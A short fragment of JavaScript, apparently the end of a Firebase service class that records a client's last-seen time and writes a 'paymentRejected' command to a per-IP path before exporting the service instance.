            lastSeen: Date.now()
          });
        }
      }, { onlyOnce: true });

      // Send command to client
      set(ref(db, `commands/${safeIp}`), {
        action: 'paymentRejected',
        message: payload.message,
        timestamp: Date.now()
      });
    }
  }
}

export const socketService = new FirebaseService();